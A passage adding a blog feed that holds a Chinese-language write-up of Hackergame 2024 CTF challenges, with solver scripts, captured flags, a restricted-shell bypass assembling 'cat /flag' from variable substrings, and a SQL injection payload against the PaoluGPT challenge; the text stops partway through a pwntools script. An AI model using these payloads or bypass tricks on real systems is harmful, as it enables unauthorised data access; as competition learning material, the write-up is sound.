@@ -1,0 +1,840 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://albedowang.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://albedowang.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2025-09-12T05:41:19+00:00</updated><id>https://albedowang.github.io/feed.xml</id><title type="html">Kaijian Wang</title><subtitle>My personal website. </subtitle><entry><title type="html">Hackergame 2024 Write-Up</title><link href="https://albedowang.github.io/blog/2024/hackergame_wp/" rel="alternate" type="text/html" title="Hackergame 2024 Write-Up"/><published>2024-11-08T23:15:00+00:00</published><updated>2024-11-08T23:15:00+00:00</updated><id>https://albedowang.github.io/blog/2024/hackergame_wp</id><content type="html" xml:base="https://albedowang.github.io/blog/2024/hackergame_wp/"><![CDATA[<h1 id="writeup-for-hackergame-2024">Writeup for Hackergame 2024</h1> <blockquote> <p>Author: 夏和小(阿贝多), Overall Rank 29 /2460 (Score: 5800), USTC Rank 5 /389</p> <p>在西七区上分每次早上一起床就发现被猛超，就只能趁国内的盆友们睡觉的时候偷分了😋</p> </blockquote> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/hg_rank-480.webp 480w,/assets/img/hg_rank-800.webp 800w,/assets/img/hg_rank-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/hg_rank.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/hackergame_score-480.webp 480w,/assets/img/hackergame_score-800.webp 800w,/assets/img/hackergame_score-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/hackergame_score.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h2 id="签到">签到</h2> <p>改 URL 为 <code class="language-plaintext highlighter-rouge">http://202.38.93.141:12024/?pass=true</code></p> <h2 id="喜欢做签到的-ctfer-你们好呀">喜欢做签到的 CTFer 你们好呀</h2> <p>这不是我们 <a href="https://www.nebuu.la">NEBULA</a> 的主页吗，下次拿出来要标明出处【唐氏表情.jpg】</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ENV
+<span class="nv">PWD</span><span class="o">=</span>/root/Nebula-Homepage
+<span class="nv">ARCH</span><span class="o">=</span>loong-arch
+<span class="nv">NAME</span><span class="o">=</span>Nebula-Dedicated-High-Performance-Workstation
+<span class="nv">OS</span><span class="o">=</span>NixOS❄️
+<span class="nv">FLAG</span><span class="o">=</span>flag<span class="o">{</span>actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula<span class="o">}</span>
+<span class="nv">REQUIREMENTS</span><span class="o">=</span>1. you must come from USTC<span class="p">;</span> 2. you must be interested <span class="k">in </span>security!
+
+<span class="c"># $ ls -la</span>
+<span class="nv">$ </span><span class="nb">cat</span> .flag
+flag<span class="o">{</span>0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else<span class="o">}</span>
+</code></pre></div></div> <h2 id="猫咪问答hackergame-十周年纪念版">猫咪问答（Hackergame 十周年纪念版）</h2> <ol> <li>在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？ <ul> <li>翻 LUG 网站 -&gt; 3A204</li> </ul> </li> <li>众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？ <ul> <li>翻 Github 和 LUG 网站 -&gt; 2682</li> </ul> </li> <li>Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？ <ul> <li>翻 2018 年猫咪问答 -&gt; 程序员的自我修养</li> </ul> </li> <li>在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？ <ul> <li>看不进去，扔个 GPT -&gt; 336</li> </ul> </li> <li>10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？ <ul> <li>谷歌 -&gt; 6e90b6</li> </ul> </li> <li>大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？ <ul> <li>特地跑过去申请了一个 Llama3 的 token，跑出来 1834… 应该是哪里出问题了，从 1830 开始试 -&gt; 1833 <em>PS:后来在QQ群里看到有人发了原因，是tokenizer会在结束的地方加一个EOS导致的1834</em></li> </ul> </li> </ol> <p><em>flag{α_90oD_C@7_!$_7hE_©a7_WHO_©@n_Pas5_THe_Qui2}</em> <em>flag{t3n_¥eArs_Oƒ_hαCK3rG@me_OMed37Oบ_wiTh_И3K0_Qu!Z}</em></p> <h2 id="每日论文太多了">每日论文太多了！</h2> <p>直接搜 flag 发现了 <code class="language-plaintext highlighter-rouge">flag here</code> 但是没看到别的东西了，索性找个分离图片的工具试试</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pdfimages <span class="nt">-all</span> flag_paper.pdf output
+</code></pre></div></div> <p>发现一张图片里面有 flag</p> <h2 id="比大小王">比大小王</h2> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">json</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://202.38.93.141:12122</span><span class="sh">"</span>
+<span class="n">game_route</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/game</span><span class="sh">"</span>
+<span class="n">submit_route</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/submit</span><span class="sh">"</span>
+<span class="n">token</span> <span class="o">=</span> <span class="sh">""</span>
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
+<span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">"</span><span class="s">/?token=</span><span class="sh">"</span><span class="o">+</span><span class="n">token</span><span class="p">)</span>
+<span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
+<span class="n">session</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span>
+<span class="n">game_questions_text</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="n">game_route</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{}).</span><span class="n">text</span>
+<span class="n">game_questions</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">game_questions_text</span><span class="p">)[</span><span class="sh">"</span><span class="s">values</span><span class="sh">"</span><span class="p">]</span>
+
+<span class="n">ans</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">question</span> <span class="ow">in</span> <span class="n">game_questions</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">question</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">question</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
+        <span class="n">ans</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">question</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">question</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
+        <span class="n">ans</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Error</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">session</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="c1"># 防止经典时空穿越
+</span><span class="nf">print</span><span class="p">(</span><span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="n">submit_route</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">inputs</span><span class="sh">"</span><span class="p">:</span>  <span class="n">ans</span><span class="p">}).</span><span class="nf">json</span><span class="p">())</span>
+</code></pre></div></div> <h2 id="powerfulshell">PowerfulShell</h2> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PowerfulShell@hackergame&gt; <span class="nv">_1</span><span class="o">=</span>~ <span class="c"># /players</span>
+PowerfulShell@hackergame&gt; <span class="nv">_2</span><span class="o">=</span><span class="k">${</span><span class="nv">_1</span>:2:1<span class="k">}${</span><span class="nv">_1</span>:7:1<span class="k">}</span> <span class="c"># ls</span>
+PowerfulShell@hackergame&gt; <span class="nv">_3</span><span class="o">=</span><span class="k">${</span><span class="nv">_1</span>::1<span class="k">}</span> <span class="c"># / </span>
+PowerfulShell@hackergame&gt; <span class="nv">_8</span><span class="o">=</span><span class="sb">`</span><span class="nv">$_2</span> <span class="nv">$_3</span><span class="sb">`</span> <span class="c"># result of `ls /`</span>
+PowerfulShell@hackergame&gt; <span class="nv">_7</span><span class="o">=</span><span class="k">${</span><span class="nv">_8</span>:17:4<span class="k">}</span> <span class="c"># flag</span>
+PowerfulShell@hackergame&gt; <span class="nv">_6</span><span class="o">=</span><span class="k">${</span><span class="nv">_8</span>:15:1<span class="k">}${</span><span class="nv">_8</span>:19:1<span class="k">}${</span><span class="nv">_8</span>:7:1<span class="k">}</span> <span class="c"># cat</span>
+PowerfulShell@hackergame&gt; <span class="nv">$_6</span> <span class="nv">$_3$_7</span> <span class="c"># cat /flag</span>
+flag<span class="o">{</span>N0w_I_Adm1t_ur_tru1y_5He11_m4ster_da95bf98fc<span class="o">}</span>
+</code></pre></div></div> <p>拼就完了，但是我开始是不知道 <code class="language-plaintext highlighter-rouge">$_2 $_3</code> 会返回 eval 后的结果的，运气好试出来的 ：））））</p> <h2 id="paolugpt">PaoluGPT</h2> <p>简单的 SQL 注入</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">tqdm</span>
+<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
+
+<span class="n">token</span> <span class="o">=</span> <span class="sh">""</span>
+<span class="n">encoded_token</span> <span class="o">=</span> <span class="nf">quote</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+
+<span class="n">START_URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://chal01-manager.hack-challenge.lug.ustc.edu.cn:8443/docker-manager/start?</span><span class="sh">"</span> <span class="o">+</span> <span class="n">encoded_token</span>
+<span class="n">LIST_URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://chal01-4rpssnu9.hack-challenge.lug.ustc.edu.cn:8443/list</span><span class="sh">"</span>
+
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
+<span class="n">init</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">START_URL</span><span class="p">)</span>
+<span class="n">chat_list</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">LIST_URL</span><span class="p">).</span><span class="n">text</span>
+<span class="n">chat_lists</span> <span class="o">=</span> <span class="n">chat_list</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">&lt;li&gt;</span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">:]</span>
+
+<span class="c1"># Challenge 1
+</span><span class="k">for</span> <span class="n">lines</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">.</span><span class="nf">tqdm</span><span class="p">(</span><span class="n">chat_lists</span><span class="p">):</span>
+    <span class="k">if</span> <span class="sh">"</span><span class="s">/view?conversation_id=</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
+        <span class="n">conversation_id</span> <span class="o">=</span> <span class="n">lines</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">/view?conversation_id=</span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="nf">len</span><span class="p">(</span><span class="sh">'</span><span class="s">48e475ff-9234-4da6-97b2-6dfec81e757e</span><span class="sh">'</span><span class="p">)]</span>
+        <span class="n">view_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">https://chal01-4rpssnu9.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=</span><span class="si">{</span><span class="n">conversation_id</span><span class="si">}</span><span class="sh">"</span>
+        <span class="n">view</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">view_url</span><span class="p">).</span><span class="n">text</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sh">"</span><span class="s">flag</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">view</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">conversation_id</span><span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">view</span><span class="p">)</span>
+            <span class="k">break</span>
+<span class="c1"># flag{zU1_xiA0_de_11m_Pa0lule!!!_73a5cee3f9}
+</span>
+<span class="c1"># Challenge 2
+</span><span class="n">view_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">https://chal01-4rpssnu9.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=-1</span><span class="sh">'</span><span class="s">or shown=false--</span><span class="sh">'"</span>
+<span class="n">view</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">view_url</span><span class="p">).</span><span class="n">text</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">view</span><span class="p">)</span>
+<span class="c1"># flag{enJ0y_y0uR_Sq1_&amp;_1_would_xiaZHOU_hUI_guo_657f7eaad1}
+</span></code></pre></div></div> <h2 id="强大的正则表达式">强大的正则表达式</h2> <p>学过的编译原理最有用的一集（虽然最后还是用的传奇轮子 <code class="language-plaintext highlighter-rouge">greenery</code>,简直是我爹</p> <p>这里只给最后一问的 exp，因为三个都是一样的，只需要改一下 <code class="language-plaintext highlighter-rouge">alphabet</code> 和 <code class="language-plaintext highlighter-rouge">state</code> 以及 <code class="language-plaintext highlighter-rouge">map</code> 就可以</p> <p>最后一问主要就是要注意到 <code class="language-plaintext highlighter-rouge">CRC GSM8</code> 也是有固定的状态转换的，所以就和前两纹眉有任何区别，手动写一份/写脚本生成一个 <code class="language-plaintext highlighter-rouge">map</code> 就可以。</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">greenery.fsm</span> <span class="kn">import</span> <span class="n">fsm</span>
+<span class="kn">import</span> <span class="n">re</span>
+<span class="kn">import</span> <span class="n">libscrc</span>
+
+<span class="n">alphabet</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">}</span>
+<span class="n">states</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">}</span>
+<span class="n">initial</span> <span class="o">=</span> <span class="mi">7</span>
+<span class="n">finals</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">}</span>
+
+<span class="nb">map</span> <span class="o">=</span> <span class="p">{</span>
+ <span class="mi">0</span><span class="p">:</span> <span class="p">{</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span><span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">:</span> <span class="mi">7</span><span class="p">},</span>
+ <span class="mi">1</span><span class="p">:</span> <span class="p">{</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span><span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5</span><span class="p">},</span>
+ <span class="mi">2</span><span class="p">:</span> <span class="p">{</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span><span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span><span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">:</span> <span class="mi">3</span><span class="p">},</span>
+ <span class="mi">3</span><span class="p">:</span> <span class="p">{</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span><span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span><span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">},</span>
+ <span class="mi">4</span><span class="p">:</span> <span class="p">{</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span><span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">:</span> <span class="mi">4</span><span class="p">},</span>
+ <span class="mi">5</span><span class="p">:</span> <span class="p">{</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span><span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">:</span> <span class="mi">6</span><span class="p">},</span>
+ <span class="mi">6</span><span class="p">:</span> <span class="p">{</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span><span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span><span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">},</span>
+ <span class="mi">7</span><span class="p">:</span> <span class="p">{</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="s">5</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span><span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span><span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span><span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">:</span> <span class="mi">2</span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="n">divisible_by_3_fsm</span> <span class="o">=</span> <span class="nf">fsm</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">states</span><span class="p">,</span> <span class="n">initial</span><span class="p">,</span> <span class="n">finals</span><span class="p">,</span> <span class="nb">map</span><span class="p">)</span>
+<span class="n">regex</span> <span class="o">=</span> <span class="n">divisible_by_3_fsm</span><span class="p">.</span><span class="nf">lego</span><span class="p">()</span>
+<span class="n">final</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">regex</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">)?</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">|)</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">[29]</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">(2|9)</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">[38]</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">(3|8)</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">final</span><span class="p">))</span>
+
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="sh">'</span><span class="s">202.38.93.141</span><span class="sh">'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">30303</span>
+<span class="n">token</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
